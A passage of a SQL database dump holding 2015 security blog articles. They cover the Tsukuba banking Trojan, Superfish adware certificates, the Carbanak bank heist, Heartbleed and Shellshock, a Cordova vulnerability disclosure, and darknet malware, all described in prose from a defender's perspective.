to malicious URLs set up by the botmaster and then interact with these victims thereon in order to extract credentials and PII from them. Overall, Tsukuba’s every move is calculated and selective, from its very installation procedure to the victim IPs it will let through to its interactive Web-fakes. To begin, the Trojan is dropped via spam email in a packed form, which is programmed to resist debugging and analysis. Upon running the Tsukuba executable, the packer itself uses the CreateProcess API by way of the suspended state flag (aka process hollowing). The suspended son process is unpacked and changes its entry point to camouflage the malicious installation. Because it is impossible for the malware to attach to a suspended process, it waits for the process to resume and then finalizes the installation, terminating before someone can attach a debugger or analyze it. The next action Tsukuba takes is abusing a legitimate Windows process (“ “) in order to disguise itself while communicating with its command-and-control (C&C) server and downloading other components and run commands if need be. To evade research environments and proxy detection tools, Tsukuba looks for a list of running processes to avoid, and if one is indeed found, the malware will not complete the installation of all of its components: But Tsukuba is not ready to proceed quite yet. Before completing its installation, the malware must determine that the potential victim is relevant to its masters by copying their browser cookies and scanning them for the URLs of its target entities (triggers). Only if the infected machines visit one of the listed banks will the malware continue its installation process. In yet another preparatory move, Tsukuba registers a fake   in order to browse to malicious pages through its own rogue proxy. To do that without raising any red flags, it sets up a root certificate on the PC with the exact same name as the original; typically, that name is “VeriSign Class 3 Public Primary Certification Authority – G5.” This procedure leverages another legitimate Windows process, “certutil.exe,” which allows Tsukuba’s sessions to pass as trusted through the browser. To execute the actual proxy modification on the infected machine, Tsukuba will need Proxy Auto-Config (PAC) instructions. It sends an HTTP GET request to its C&C and receives up-to-date information about the malicious proxy to use. The response comes through packed and obfuscated using JavaScript eval(), a basic coding method used for obfuscation purposes. Upon the receipt of this data, the malware uses it to add a PAC URL path to the browser’s configuration scheme. This new malicious PAC file sets the automatic choice the browser will make when fetching a URL for the user. Making a change to this default choice and replacing it with the attacker’s proxy encourages results in the browser’s favoring it, thereby directing the user’s requests to the attacker’s URL choices: The rogue proxy is now in place. But not so fast — only victims browsing from Japanese IPs will be let though to the Trojan’s custom social engineering zones. All others will meet an unreachable browser message. At this time, Tsukuba can apply its malicious proxy changes to three popular browsers: Microsoft Internet Explorer, Google Chrome and Mozilla Firefox. Unlike Tsukuba’s basic proxy-changing capabilities, its social engineering face is much more sophisticated, using a technique that has become very popular among cybercriminals in the past year: interactive Web-fakes. This method consists of sending the victim to fake bank pages. It is similar to phishing, but unlike simple, credential-slurping phishing, these attempts are highly customized and interactive. This means the pages victims reach are tailored to the bank they tried to browse to: The look and feel is dynamically pulled from the legitimate bank’s portal, and the fake pages actually interact with the victim via pop-ups. In Tsukuba’s case, after victims enter their credentials, the pop-ups proceed to ask them for personal details and to upload clear images of their official documentation and passport. Looking at similar malware of Tsukuba’s grade, this extensive social engineering component definitely goes far beyond the common. Some examples from Tsukuba’s arsenal are a fake counter, likely designed to rush the victim to act, with detailed instructions on what to do next: IBM Trusteer researchers have examined the pop-ups and translated them from Japanese. One of these fake screens reads as follows: The original image appears below: As soon as victims upload files into the interactive fake page, they are redirected to a final fake showing a “Session Expired” page or to Google.com. Following the first credential harvest from the infected account holder, Tsukuba’s botmasters make sure to keep their victims unwitting and revert back to the normal proxy settings. To do that, the malware queries its C&C server for a new PAC and this time receives a “clean” version that reverts the settings to normal browsing. This will deliver victims directly to their original bank page as soon as they attempt to access it, removing any suspicion they may have had after the social engineering session. Examining Tsukuba indeed proves that it is a malicious (yet basic) proxy changer. Its security bypass techniques rely on abusing legitimate processes and registering a certificate, and its evasion from analysis tools and prying eyes is especially simplistic. The more interesting part of the malware’s modus operandi is the use of an extensive social engineering scheme over interactive fake bank pages, predesigned for this purpose and highly customized per the target entity. This threat is considered severe for the amount of information it collects. The theft of online banking credentials, along with the victim’s PII and images of official documents — in addition to the possibility of executing additional malware on his or her endpoint — is a loaded combination. Furthermore, the fact that the more substantial portion of the attack takes places on fake pages makes it harder for security tools to detect or stop it.   can help protect banks and banking customers from the Tsukuba malware.', '\'Banking Trojan\', \'Financial Malware\', \'IBM Security Trusteer\', \'Malware\', \'Social Engineering\', \'Trusteer\'', 'https://securityintelligence.com/tsukuba-banking-trojan-phishing-in-japanese-waters/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (454, 'Cyber Forensics: From Dark Arts to Common Practice', 'Vijay Dheap', '2015-3-3', 'Time is of the essence, but pressures abound and skills and resources are limited. How is a security team supposed to cope with attackers’ increased sophistication and focus? The answer may lie in cyber forensics. Imagine if the analysts on your security team could be empowered to use their human intuition and logical deduction to retrace the activities of an attacker. The legacy of   is that of a specialized few only being called upon when a situation was dire. Now, cyber forensics approaches are becoming crucial when it comes to determining the type, size and scope of a breach or attack. This growing significance means the practice has to evolve. Security teams must become more self-sufficient in order to identify and remediate gaps in their organization’s security posture. With this in mind, IBM introduced its   solution. It allows for a broader set of the security team — not just data scientists or trained forensics investigators — to retrace an attacker’s steps, visualize frequency-based entity-to-entity relationships and identify suspicious activities based on built-in rules that operate on the content of the conversation, such as document text or email content, rather than just the metadata. For big data analytics, this solution also does the following: \n This approach to helping address incident response requirements provides a single platform in which organizations can encapsulate the core set of forensics tools and apply the   principle of delivering security intelligence. The tools sift through data, perform analyses and visualize different perspectives, while the intelligence improves enterprise-wide productivity by planting guideposts in the data and automating crucial elements of the forensics. Image Source:', '\'Cyber Forensics\', \'Cybersecurity\', \'Data Security\', \'IBM Security QRadar\', \'IBM Security QRadar Incident Forensics\', \'Security Analytics\'', 'https://securityintelligence.com/cyber-forensics-from-dark-arts-to-common-practice/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (455, 'IBM Application Security on Cloud Saves the Day', 'Roee Hay', '2015-2-28', 'In July 2014, David Kaplan and I found a series of vulnerabilities (CVE-2014-3500/1/2) in the   framework for mobile apps that enabled a remote drive-by exploitation attack. Adhering to our responsible disclosure policy, we reported the issues to the Apache team, which released a patch soon after. We then publicly   the issues. Apache Cordova, previously known as PhoneGap, is a platform that lets developers make use of HTML5 as a single cross-platform development technology. According to  , Cordova is used in just under 6 percent of all Android applications. It also shows prevalence in app store categories that could be of interest to attackers, such as business, medical and finance, where more than 12 percent of all applications in every category are based on Cordova. During the recent   event in Las Vegas, I   our findings with fully working exploits we developed. The following is a short overview of Cordova that revisits these discoveries and the way in which we found them. Although we presented in a previous blog post WHAT we found, we have never before revealed HOW we found it. \n Among the issues we found was a very severe one, CVE-2014-3500, a cross-application scripting vulnerability that allowed for a malicious JavaScript execution in the context of a vulnerable Cordova-based app. Due to the severity of this issue,   sent out a message at the beginning of October to all application developers using a vulnerable version of  . The company asked them to update to a non-vulnerable version as soon as possible or risk sanctions against their applications on Google Play. The vulnerability was due to the fact that the attacker could control the URL of   embedded browser (WebView), the core of every Cordova-based app, using an   containing a malicious extra parameter. The following is the vulnerable piece of code: The getProperty method consumes an extra parameter from the input intent named as its first input parameter — “url,” in this case. So, how did we find the issues? In the past few years, we have researched and developed a powerful runtime analysis tool that can detect and pinpoint this type of vulnerability. Our tool,  , gets an Android application package file as its input, finds various parameters that can be controlled by the attack and attempts to discover potential security issues that can arise due to these weaknesses. In the Cordova case, for example, IBM Application Security on Cloud detected that the attacker can control the “url” Intent extra parameter in order to manipulate the URL of the embedded browser. Using this tool, we found several other interesting issues, which were responsibly disclosed to the relevant vendors. Some of them were blogged about, including the   in the Android framework and a couple of vulnerabilities in   for Android. To learn more, take a look at my recent   from IBM InterConnect 2015. Image Source:', '\'Android\', \'Apache Cordova\', \'Mobile Security\', \'Vulnerability\'', 'https://securityintelligence.com/ibm-mobile-analyzer-saves-the-day/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (456, 'Adware Adds to Security Headaches', 'Doug Franklin', '2015-2-27', 'Over the past few days, we have seen a security incident involving adware explode in the press. The original claims surprised the industry, and the reality actually became more surprising as we learned more. However, as Mark Twain said, “Fiction is obliged to stick to possibilities. Truth isn’t.” This adware incident varies in one very significant way from the notable  . Those incidents originated with programming errors latent in software implementations, while the adware incident started with conscious decisions. The   incident began with revelations about adware installed by a computer vendor on some models of its consumer laptops. Vendors agree to install this software to reduce the purchase price of the computers. The producers of the adware either pay the vendor to install their products, offer the vendor a cut of the ad revenue or conduct some combination of both. The Superfish Visual Shopper adware, though, was caught snooping on secure HTTPS connections. The scrutiny invited by those discoveries quickly revealed a much bigger problem, and although the snooping was bad enough, the implications of the methods used were a lot scarier. Adware needs no introduction for this audience, having been an issue for a long time. Nonetheless, it’s an opportunity to point out that any software added to a system increases its attack surface and therefore, its risk of compromise. However, most adware doesn’t try (at least actively) to compromise secure connections. In that sense, it presents less of a concern than the current flap surrounding   and Superfish and the companies that distribute them. At the root of this incident, the Visual Shopper adware uses technology from Komodia to snoop on secure connections. The Komodia software installs a local proxy to perform a man-in-the-middle (MitM) attack on secure connections. To do this without raising alarms from browsers, it installs a certificate into the system. The installation registers this certificate as being that of a root certificate authority (CA). That privileged status allows the certificate to sign any other certificate while avoiding warnings from the browser or notice from the user. As if that wasn’t bad enough, the adware installs the same certificate on large numbers of computers. It also packages the private key with the certificate so that the proxy can sign additional certificates. Additionally, the certificate uses an outdated SHA1 hash and RSA encryption with a weak 1,024-bit key. The passwords for many certificates are trivial and the same: seven letters, all lowercase. To complete the mess, if the MitM proxy runs into a certificate that fails validation, it creates a new one for that domain and signs it with the root CA certificate; the user never sees the problem with the original certificate. Adversaries can use these certificates in the same way the interception technology uses it: to unveil the contents of sessions that users believe to be secure. Adware producers insist they use their technology only to provide ad services. But those root CA certificates make it simple for anyone to steal credentials, account details and anything else protected by an Secure Socket Layer (SSL) connection. To make use of the certificate, the adversary must accomplish a couple of things. First, it needs the private key that goes with the certificate. Unfortunately, the private key is packaged with the certificate, so the proxy can sign new certificates. Second, it needs the signing password for the key. Within hours of publicly disclosing this issue, security researcher   determined the password and, because he’s so good, that the password was trivial. So, the first two obstacles fell in the first 48 hours of public scrutiny. Within another 48 hours, the scrutiny revealed an entire suite of these fake root CA certificates used by different adware campaigns. The final serious hurdle for an adversary is getting the fake root CA certificate onto a target computer. That may sound difficult, but exploit kits, drive-by download servers and the tools they dispense can handle it easily. The success of phishing and spear phishing campaigns implies a reasonable likelihood of finding victims, even from a narrowly targeted group. Plus, the adversaries have the adware companies and distributors working for them to distribute these certificates far and wide. What can an adversary do once he or she smuggles one of these certificates into a computer? That link in a spear phishing email that used to produce browser warnings about   doesn’t anymore. Perhaps it was an HTTP link, and now it’s an HTTPS link so that the malware can hide its activities from network defenses and not produce warnings from the browser. The adversary could do what the adware does and install a local proxy that uses that fake root CA certificate to strip the security from the sessions intended to be secure. It’s bad enough that the   felt the need to issue Vulnerability Note VU#529496, “Komodia Redirector with SSL Digestor fails to properly validate SSL and installs non-unique root CA certificates and private keys.” It’s bad enough that, according to  , Microsoft promptly reported the Windows Defender system would start by identifying and eliminating Superfish applications and certificates. Antivirus software vendors are also moving quickly to add protection to their products. As we continue to see expansion in the breadth of the applications affected, the number of fake root CA certificates and the techniques to exploit them, things could get pretty rough. The furor started over a single laptop vendor and the software it loaded onto some consumer models of laptops. The passing days have shown a number of other applications affected, as listed by  , and those discoveries are likely to continue. The adware involved in the situation has reportedly been bundled with various software downloads and loaded by computer vendors. At the very least, thousands or more individual machines harbor suspicious adware and discredited but powerful SSL certificates. Further research is uncovering   the certificates. Fortunately, this batch of fake root CA certificates can mostly be identified as a class. The certificates use very weak basic parameters and should be banned for that alone. Simply identifying those weak parameters can allow for more generic protection than “block any certificate with Superfish in the text fields.” However, the adware could just as easily have used certificates with stronger parameters, making the certificates impossible to distinguish as a class — that is, unless the creators leave “footprints.” Superfish did this by leaving its name in the text fields of the certificates and using suspiciously weak certificate parameters. Had Superfish used a little more finesse, those certificates likely would have gone unnoticed for even longer. It helps to eliminate the certificates individually as they become known, but this represents another game of Whac-A-Mole. Any MitM attack can obviously extract credentials and other sensitive information if the operator wants, or if a third party manages to co-opt the infrastructure. The MitM attack has full access to the contents of those supposedly secure sessions, but the adware companies insist they don’t to and wouldn’t do that. Even if they don’t, however, the certificates they’re dropping on unsuspecting users’ computers enable others to compromise “secure” connections, too, even without taking over the rest of the adware infrastructure. Adware companies are surely not the only threat, either. As the Superfish saga unfolded, researchers caught   snooping on HTTPS connections. It also uses fake root CA certificates, but it at least generates new ones for each installation. Nonetheless, its proxy signs every certificate with its root key, hiding problems with the original certificate from the browser and the user. An article by   gives a good overview on the difference. In addition, the Gogo airline in-flight Wi-Fi service stands accused of stripping “secure” connections as well, according to  , and intentionally issuing fake SSL certificates. This report probably caused more consternation in enterprise IT departments than the Superfish situation, because executives and other staff may use Gogo for Virtual Private Network sessions while in flight. Even some Adobe Reader updates attempt to slip “bundleware” onto your system in the form of McAfee’s antivirus product. The adware situation should not affect enterprises that provision computers from standardized operating system images, since that eliminates any software loaded by the vendor. Businesses that purchase commodity systems may need to exercise caution to ensure the machines they receive come without vendor-installed software or with only agreed-upon software if it was indeed installed by the vendor. Make sure your defense systems stay up-to-date, human and mechanical. Security vendors take this issue seriously and are adding defenses against Superfish certificates. Expect them to expand those defenses as researchers identify other certificates, and enhance your user training to include a focus on those security warnings that pop up from the browser periodically. Explore examples of what a user might see. Enterprises can tightly control the installation of software on company-issued equipment to prevent things such as adware getting in later. The bring-your-own-device environment complicates matters, but requiring up-to-date defenses on any device connecting to your network falls into the category of “prudence.” For Windows administrators, the “certutil.exe” Windows utility program can manipulate Windows key stores to allow scripts to identify and remove other risky certificates. Firefox has its own certificate store and tools. The Network Security Services Tools’ certutil.exe program provides a similar functionality to the Windows tool of the same name. Some endpoint management systems can help. Scan your systems for weak certificates from any other source, get rid of the ones you can’t positively identify and update the rest to more secure parameters and passphrases. In addition, expect researchers to identify more systems intercepting secure sessions. The original Superfish furor brought this issue to the front pages, getting people interested in taking a look at the situation. With reports about an in-flight Wi-Fi service possibly intercepting secure connections, you can bet enterprise IT departments everywhere are paying attention. This situation does reinforce the importance of due diligence before allowing new software into your enterprise, even peripherally. The adware applications don’t have to get into your network to cause problems if the certificates get inside. The exploitation window should be closing for these particular certificates now that they’re public and security vendors are adding defenses. Keep in mind that there will probably be more and new fake root CA certificates and new actors trying to smuggle them onto your users’ systems. Superfish says it really doesn’t see a problem. As of Friday, Feb. 20, the chief executive officer of Superfish still insisted his company’s products “ .” It may be more worrisome if that’s true than otherwise. If other companies out there feel the same way, the world faces more problems of this sort. It appears that Superfish, at least, remains unrepentant.', '\'Adware\', \'Secure Sockets Layer (SSL)\', \'Superfish\'', 'https://securityintelligence.com/adware-adds-to-security-headaches/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (457, '2014: The Year That the Internet Fell Apart', 'Robert Freeman', '2015-2-23', 'Time flies. It is already late February in 2015 as we reflect on 2014 as the year the Internet fell apart at IBM InterConnect. It feels like it was just yesterday that  , the information disclosure vulnerability in OpenSSL, was announced. At the time, IBM quickly sprang into action and released multiple network intrusion prevention system signatures that covered all the threat’s permutations. Exploitation was swift and seemingly relentless. Even as the year progressed, from a managed security services perspective, IBM still observed customers being attacked, but not exploited, by Heartbleed. There are many things that make Heartbleed fascinating. One of the key aspects is that it is not a remote code vulnerability in itself. Rather, the vulnerability permits an unauthenticated attacker to obtain a small but useful amount of system RAM data in the response. Heartbleed was just one of a few notable major vulnerability disclosures in 2014. The next,  , was just as shocking — if not more so — because of how long it had gone unnoticed. In the case of Heartbleed, the vulnerability had only been introduced two years or so earlier. With Shellshock, the vulnerability in the bourne-again shell had already been around for 25 years. This vulnerability facilitated the practical exploitation of Common Gateway Interface-based Web servers, OpenSSH servers, some Dynamic Host Configuration Protocol clients and other software to run commands as unauthenticated users or, in some cases, escape from a restricted shell, if authenticated. The scary thing is how many embedded devices (I suppose we call them the Internet of Things these days) are vulnerable and will be exposed for a very long time, since the devices won’t receive a firmware update or be updated by their users for whatever reason. At the IBM InterConnect session “2014: The Year That the Internet Fell Apart” at 2 p.m. on Monday, February 23rd, I will dive into these two vulnerabilities and how attacks using them progressed. Additionally, I will share the highlights of the Unicorn bug, a vulnerability in Microsoft Windows I discovered and reported to Microsoft late last year. The goal is to discuss mechanisms and processes companies can use to gain better defenses in an interactive session. If you think you won’t be the next big breach story, let’s preview where the panel discussion is going to head. In 2015, there have already been some highly noteworthy bugs, such as   and JASBUG. It seems that bugs that are so old someone should have stumbled upon them sooner will continue to be discovered and disclosed throughout the year. Perhaps 2014 is not the year the Internet fell apart and 2015 will be. Join me, our guest speaker, Alain-Désiré Kamenyero from Scotiabank and my esteemed IBM colleagues,   and Jamie Licitra, at InterConnect 2015 to learn more about our   on how the major vulnerabilities of 2014 affected organizations from around the world.', '\'Cybersecurity\', \'Heartbleed\', \'IBM InterConnect\', \'Malware\', \'Shellshock\', \'Vulnerabilities\'', 'https://securityintelligence.com/2014-the-year-that-the-internet-fell-apart/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (458, 'Carbanak: How Would You Have Stopped a $1 Billion APT Attack?', 'Limor Kessem', '2015-2-23', 'In what’s shaping up to be a textbook classic, Carbanak, a major   against financial institutions around the world, may be considered the largest cyberheist to date. The scope of the attack and the losses it has caused make its case so significant. The surprise factor in this APT attack was the criminals’ change in approach and careful planning. Unlike the usual cybercriminal method of stealing consumer credentials or compromising individual online banking sessions with malware, the brazen Carbanak gang targeted banks’ internal systems and operations, resulting in a multichannel robbery that averaged   per bank. At the time of this post, attacks connected to the Carbanak operation are reportedly still active. Attacking financial organizations from within is more complicated to execute than impersonating online banking users. Such a large-scale APT operation took planning, skill and resources that are not commonly seen from many organized cybercrime gangs. The main factor that let attackers cause such damage was inadequate   controls. While the financial sector has been fervently working for decades to prevent fraud and strengthen its detection and protection mechanisms, it has not been as aware of the threats to corporate systems and internal operations networks. Since banks possibly did not expect cybercriminals to be able to attack from within the bank’s systems, internal core systems were not protected by adapted solutions that would have stopped this sort of attack. It was only a matter of time before criminals conceived and executed an operation of this scale. The relative ease of the breach and its staying power highlight the need for much more stringent security controls to protect both employee endpoints and banks’ core systems. This stealthy APT attack has gone unnoticed since the end of 2013. It was highly active yet remained undetected. Initial infiltration was facilitated by spear phishing emails and exploit-laden attachments that compromised employee endpoints with malware, eventually stealing credentials, taking over their endpoints and abusing their user privileges. Research reports on the case indicate that once attackers were inside the breached networks, they were met with weak controls and sometimes basic detection capabilities. The proper operation of bank systems that run proprietary software and specific hardware was compromised because attackers were able to study it. This reconnaissance was easy via the use of run-of-the-mill malware features such as keyloggers, screenshot grabbers, remote administration tools, and a Video Grabber. All of these are basic malware capabilities that have been used by cybercriminals for about a decade now. At this time, some of the organizations are still seeing related malicious activity taking place. They are working to spot its source, contain the threat and fully halt the attacks. Like many other APT attacks, this heist started out slow and steady as the gang schemed and established a stronghold inside its targets’ most guarded internal environments. To begin, the criminals bought access to bank employee computers that were already compromised by massively distributed opportunistic malware. Dark Web cybercrime vendors who run immense botnets sell access to a wide selection of compromised zombies from any country. A quick search for a user’s email domain can reveal the company he or she works for, allowing criminals to zero in on a target. Price tags for remote desktop-based access run no more than a few dollars. Once the Carbanak team had an initial back door into the targeted banks, it followed up with   designed to trick employees in the same bank and those working in other banks. The emails contained exploit-laden attachments that downloaded an insidious Trojan into the machines when they were opened by employees. The malware used in this operation started out as variants of Anunak, Qadars and some   varieties. However, the latest samples show that the gang moved on to use entirely new malware. Although the “Carbanak” name used by researchers is a combination of the aliases “Carberp” and “Anunak,” the actual samples are not related to either code at this point. The steps that followed after new victims’ endpoints were unknowingly infected by malware are common to all APT attacks: privilege escalation, lateral movement into internal systems inside the bank’s infrastructure, deeper reconnaissance and eventual impact. To study the compromised banks’ internal systems, the attackers placed designated operators on the watch, having them view regular video- and screen-capture feeds the malware grabbed and transmitted back to the attackers. They were thereby able to gradually learn the inner workings of the bank employees’ operations with the purpose of using the employees’ stolen credentials and mimicking them on D-Day. The use of keyloggers and data-stealing malware capabilities provided the hostile watch team with all the necessary access credentials and user rights to eventually launch the next phase of this attack, which included a variety of ways to steal large sums of money from the banks they targeted. The APT was a mix of multichannel fraud that abused both online and physical systems from within and via the banks’ service channels. The attackers did the following: Operating like a well-oiled machine, this Eastern European cybercrime gang managed to go unnoticed for well over a year while continually attacking from within. The operation was supported by a wide network of live money mules and mule accounts of all grades, which enabled the thieves to rob millions of dollars from each bank. The full scope of this operation was recently made public by Kaspersky Lab researchers who handled the incident response at a bank that was attacked in Ukraine. Kaspersky’s report estimated this attack affected more than 100 banks across 11 countries. Estimated losses have tripled from $300 million on   to $1 billion  . \n This complex attack’s technical success and detrimental results are due to the fact that the criminals were able to infiltrate the network using compromised employee endpoints, learn about the inner workings of internal systems and gain an insider’s user-grade access to the bank’s systems. Not only did the attackers compromise employee endpoints and bank networks, but they remained undetected for an extended period, which allowed them to covertly study employees’ daily activity for as long as they needed to before they executed their plan. Standard detection capabilities did not suffice here. Exploitation, download, installation, malware modules, exfiltration, remote access and endpoint takeover, as well as repeated illegitimate actions, were not discovered by the existing security for many months. Had the reconnaissance stage of the attack been discovered quickly, the entire operation would have failed. What was needed in the Carbanak case is a multilayered defense approach to protect corporate endpoints against advanced malware and credential theft — for example, disrupting the exploit chain that was used in the Carbanak attack to download remote access Trojans and other malware on the machine. By disrupting the exploit chain, the spear phishing scheme would have failed and employee endpoints would not have been compromised to begin with. For already compromised machines, the ability to identify and block suspicious attempts to establish communication channels with the attackers could have made a difference by stopping the exfiltration of video feeds and screen captures accumulated by the criminals. While using some legitimate tools for malicious purposes, Carbanak’s botmasters also deployed malware such as the Ammy remote administration tool on   to take them over. Had this unsafe download been stopped on time, the subsequent endpoint takeover would have made things a lot harder for the attackers. Endpoints that were abused via Virtual Network Computing needed more stringent protection that would have flagged the suspicious sessions and exposed the attackers’ progress before they would have had a chance to cause further damage. According to reports on this large-scale APT attack thus far, Carbanak is a very well-orchestrated crime operation, but it is not as sophisticated on a technical level — nor is it impossible to protect against. To learn more about layered defenses banks can use to protect employee endpoints and internal systems, read about  .', '\'Advanced Persistent Threat (APT)\', \'Carbanak\', \'Cybercriminals\', \'Cybersecurity\', \'Financial Malware\', \'Fraud\', \'IBM Security Trusteer\', \'Malware\', \'Trusteer\', \'Trusteer Apex\'', 'https://securityintelligence.com/carbanak-how-would-you-have-stopped-a-1-billion-apt-attack/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (459, 'The Deep Web: What’s Lurking in the Underbelly of the Internet?', 'Michelle Alvarez', '2015-2-20', 'You know when your garbage disposal is stuck and you need to reach your hand in, but you’re afraid there’s something really disgusting in there? That’s the Deep Web. This underbelly of the Internet is filled with nefarious goods such as drugs, firearms and pornography. This may not sound alluring to me and you, but for the entrepreneurial criminal, it sounds like home. While we don’t want you to visit, you should be aware of the Deep Web so you can ensure the users within your network don’t access it. It is also important that you understand there could be content being shared that pertains to you, such as potential attacks, leaked data or stolen accounts that are being sold to allow for direct access into your network. There are two mainstream Dark Webs:   and the  . Though there are other similar anonymous networks, these two are the most popular. Deployed in 2004 as a third-generation onion-routing project of the U.S. Naval Research Laboratory, Tor was intended to be used for good, not evil. It is used every day for a wide variety of purposes by many who aren’t seeking to do harm. However, Tor allows anonymous, encrypted communication from host to host. This feature, along with the ability to publish websites and other services without the need to reveal the location of the site, makes it very attractive to attackers. These sites have the domain .onion and can only be accessed once you’ve entered the  . Silk Road, one of the most notorious websites that existed on the Deep Web, was a site that specialized in buying, selling and trading all types of illegal contraband. After the first   of all Silk Road assets, another replacement site was born, dubbed  . Once again, the FBI seized the reborn website and its assets. Silk Road has now moved to the I2P network and is appropriately named  . You can think of the I2P network as Tor’s “Mini-Me.” Tor has a much larger user base and houses the majority of the malicious content, but I2P is designed and optimized for its services and includes Internet Relay Chat. I2P sites are known as eepSites, with an extension of .i2p. There could be a movement toward this network since Tor has had its issues with arrests, snooping and even malware being injected at exit nodes. If your organization isn’t interested in what the deep Dark Web has to offer, try the following:', '\'Cybercriminals\', \'Cybersecurity\', \'Dark Web\', \'Deep Web\', \'Intrusion Prevention System (IPS)\', \'Tor\'', 'https://securityintelligence.com/the-deep-web-whats-lurking-in-the-underbelly-of-the-internet/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (460, 'Broken Web Browsers: Malware’s New Address?', 'Douglas Bonderud', '2015-2-19', 'Malware has a new address: Web browsers. This is not the first time malicious code has set up shop in popular access tools such as Microsoft   and Google Chrome, but according to new research from the Ponemon Institute detailed in a recent   article, browser vulnerabilities are on the rise. What can companies do to keep corporate data safe and prevent employees from accidentally compromising secure networks using broken Web browsers? According to the report, more than 75 percent of enterprises have been infiltrated with malware via  , with the average cost of such a breach ringing in at $62,000. Despite implementing multilayer, in-depth security controls, most organizations had more than 50 breaches in the past year. In fact, 69 percent of IT security professionals surveyed said browser-borne malware is a greater threat now than it was 12 months ago. Even worse, 81 percent say insecure browsers are the primary attack vector for malware, with 74 percent claiming “traditional” detection technologies can no longer effectively stop these types of attacks. In addition, just 31 percent agree commercial browsers have the same kind of built-in security controls necessary to stop these kinds of attacks. , meanwhile, points to several factors in the spread of browser malware. First, companies are bogged down by the problem of psychological “inertia,” with 65 percent of security professionals saying it’s hard to shake their dependence on traditional security controls even when they prove ineffective. Additionally, many enterprises are still convinced browser makers have the best line on security and, with enough time, big-name brands will patch their most important malware holes. Is this just wishful thinking, however? Out in the wild of the World Wide Web, browsers are continually undergoing security upgrades. According to  , for example, Google’s Chrome 40 update recently patched 62 vulnerabilities in the browser, 17 of which were considered “high-severity” by the search giant. Most were memory corruptions or use-after-free vulnerabilities in components such as ICU, V8 or FFmpeg. In addition to internal fixes, the Google team also paid tens of thousands of dollars in bounties to freelance security researchers; one scored more than $12,000 for identifying three bugs. While this focus on security is admirable, it raises an important point: Despite Chrome’s widespread use and long history, bugs are still being discovered, some of which pose real risk to enterprises. Is bounty hunting enough to stop the threat? Also worth mentioning is the recent universal cross-scripting vulnerability discovered in Internet Explorer. As noted by  , the weakness lets malicious attackers bypass the same-origin policy, which should prevent code used by one website and loaded in an iframe on a different website from affecting the first site’s content. However, this new vulnerability allows a phishing attack that takes the form of a legitimate-looking link on an authentic Web page. When clicked, a rogue page is opened, but because the same-origin policy is bypassed, the browser’s address bar continues to show the legitimate Web page address. For example, in the context of a banking site, this means users could be redirected to malware-laden pages but have no idea because the Web address would never change. The bottom line is that all Web browsers are broken Web browsers to some degree, depending on their patch cycle and current suite of discovered vulnerabilities. According to  , there may be a common cause: laziness. It argues that Web developers have become lazy with their code when it comes to application development, but the same also applies to Web browsers. In large measure, this laziness comes as an honest reaction to consumer demand. Access trumps evaluation, and speed trumps security. The result, however, is a market of commercial Web browsers unable to handle advanced malware threats, putting corporate users at risk. Managing browser security requires a twofold approach. First, enterprises must be willing to give up traditional methods of protection in favor of   that acts in real time to detect malicious code or suspicious behavior. Gone are the days of catchall firewalls and zero-day patches. Second, organizations must shed the notion that browsers are the first line of   or form the basis of any secure defense. It is better to assume a breach is imminent, happening or has just occurred rather than be surprised by newly discovered, damaging vulnerabilities. Browser malware is on the rise and is here to stay. Combating the problem requires a change of address — security needs a new home.', '\'Cybersecurity\', \'Malware\', \'Threat Management\', \'Vulnerability\'', 'https://securityintelligence.com/broken-web-browsers-malwares-new-address/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (461, 'The Darknet Isn’t Just for Dark Deals', 'Etay Maor', '2015-2-17', 'Drugs, guns, stolen identities — the media has recently started talking more about the types of activities and e-commerce taking place on  . Sites such as Silk Road, Silk Road 2.0, BMR and   — the currency of choice on the Tor darknet — have been openly discussed and analyzed. It seems the focus today is around darknets’ hidden services rather than the growing use of darknet as an infrastructure for malware communication. Malware authors have been using darknets for malware communication for quite some time now. Notable examples include the Mevade Botnet, which communicated over Tor, the Chewbacca point-of-sale malware and  , which utilized the I2P darknet. Using a darknet’s infrastructure for malware-to-C&C communication (and vice versa) addresses a major security issue malware authors have: What if malware researchers understand where and how the malware communicates? What if they are able to locate and identify the C&C? With more   variants adopting this method of communication, it’s unsurprising other types of malware are also making their move into the dark. One trend that seems to be growing is the creation of darknet-based botnets.   has witnessed a rising number of distributed denial-of-service (DDoS) attacks that originate in darknets and lash out through Tor exit nodes. It is currently estimated that there are several hundred botnets residing on TOR (not all of which are used for DDoS), and the number is constantly increasing. Another concerning trend is the adoption of darknets by ransomware. The most recent ransomware to use a darknet is Cryptowall 3.0, which is now communicating over I2P. It seems cybercriminals are increasingly relying on darknets for protection. However, not all is safe in these dark areas of the Internet. Another growing trend is that of malware specifically targeting Tor users and Tor-based file sharing. To learn more about darknet-based malware and the dangers it presents to both victims and operators, please join my   session, “Major Cyberfraud Innovations of the Last Twelve Months,” which will take place on Feb. 23 in Las Vegas. In this session, we will dive into the most significant cyberfraud innovations of the past year, with a focus on financial malware, cybercriminal gangs and underground discussions and offerings.', '\'Bitcoin\', \'CryptoWall\', \'Darknet\', \'Malware\', \'Ransomware\', \'Tor\'', 'https://securityintelligence.com/the-darknet-isnt-just-for-dark-deals/');
